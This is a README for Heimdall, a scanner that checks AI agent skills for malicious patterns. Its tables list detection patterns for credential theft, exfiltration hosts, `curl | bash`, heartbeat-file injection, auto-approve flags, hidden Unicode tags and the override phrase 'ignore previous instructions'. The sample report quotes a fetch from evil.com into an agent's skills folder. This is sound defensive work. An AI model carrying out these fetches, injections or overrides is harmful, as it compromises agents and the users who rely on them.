# Heimdall 👁️

**The Watchman of Asgard - Security Scanner for AI Agent Skills**

Heimdall scans OpenClaw/Clawdbot skills for malicious patterns before installation. Context-aware scanning reduces false positives by ~85%.

## v3.0 Features (NEW)

From **HiveFence Scout**, **PromptArmor**, and **Simon Willison**:

| Category | Description |
|----------|-------------|
| 🌐 Remote Fetch | Detects `curl skill.md` from internet |
| 💓 Heartbeat Injection | Catches HEARTBEAT.md modifications |
| 🔧 MCP Tool Abuse | Flags `no_human_approval`, `auto_approve` |
| 🏷️ Unicode Tags | Hidden U+E0001-U+E007F characters |
| ⚡ Auto-Approve | `always allow`, `curl \| bash` patterns |
| 💰 Crypto Wallets | BTC/ETH address extraction |
| 🎭 Impersonation | "ignore previous instructions" |
| 📋 Pre-fill Exfil | Google Forms data exfiltration |

## Installation

```bash
git clone https://github.com/henrino3/heimdall.git
cd heimdall
chmod +x skill-scan.py
ln -s $(pwd)/skill-scan.py ~/.local/bin/skill-scan
```

## Usage

```bash
skill-scan <path-to-skill>
skill-scan --json <path>           # JSON output
skill-scan -v <path>               # Verbose
skill-scan --strict <path>         # Ignore context
skill-scan --show-suppressed <path> # Show suppressed
```

## Detection Categories (100+ patterns)

| Category | Severity | Examples |
|----------|----------|----------|
| `credential_access` | CRITICAL | .env, API keys, tokens |
| `network_exfil` | CRITICAL | webhook.site, ngrok.io |
| `shell_exec` | CRITICAL | subprocess, eval, exec |
| `remote_fetch` | CRITICAL | curl skill.md from web |
| `heartbeat_injection` | CRITICAL | Modifying HEARTBEAT.md |
| `mcp_abuse` | CRITICAL | no_human_approval |
| `unicode_injection` | CRITICAL | Hidden tag characters |
| `auto_approve` | CRITICAL | curl \| bash |
| `crypto_wallet` | HIGH | BTC/ETH addresses |
| `impersonation` | HIGH | System prompt injection |
| `prefill_exfil` | HIGH | Google Forms pre-fill |
| `privilege` | HIGH | sudo -S, chmod 777 |
| `persistence` | HIGH | crontab, bashrc |

## Context-Aware Scanning

Heimdall understands context to reduce false positives:

| Context | Adjustment | Example |
|---------|------------|---------|
| `CODE` | Full severity | Executable scripts |
| `CONFIG` | -1 level | YAML/JSON configs |
| `DOCS` | -3 levels | README, CHANGELOG |
| `STRING` | -3 levels | Pattern definitions |

Security tools (Prompt Guard, etc.) are auto-detected and their pattern examples are suppressed.

## Example Output

```
============================================================
🔍 SKILL SECURITY SCAN REPORT v3.0
============================================================
📁 Path: /path/to/suspicious-skill
📄 Files scanned: 5
🔢 Active issues: 14
🔇 Suppressed (context-aware): 2
⚡ Max severity: CRITICAL
📋 Action: 🚨 CRITICAL - BLOCKED - Likely malicious
============================================================

🚨 CRITICAL (10 issues):
  [remote_fetch]
    • install.sh:3  - Fetching skill from internet
      Match: curl https://evil.com/skill.md > ~/.moltbot/skills/
  [heartbeat_injection]
    • install.sh:4  - Appending to heartbeat file
      Match: >> ~/.openclaw/HEARTBEAT.md
```

## Why "Heimdall"?

In Norse mythology, Heimdall is the watchman of the gods. He guards the Bifrost bridge, can see for hundreds of miles, and hears grass growing. Perfect for watching over your AI agent skills.

## Security Sources

- [Simon Willison - Moltbook Security](https://simonwillison.net/2026/Jan/30/moltbook/)
- [PromptArmor - MCP Tool Attacks](https://promptarmor.com)
- [LLMSecurity.net - Auto-Approve Exploits](https://llmsecurity.net)
- [opensourcemalware - Crypto-Stealing Skills](https://opensourcemalware.com)

## License

MIT

## Credits

Built by the Enterprise Crew 🚀
- Ada 🔮 (Brain + BD/Sales)
- Spock 🖖 (Research & Ops)
- Scotty 🔧 (Builder)
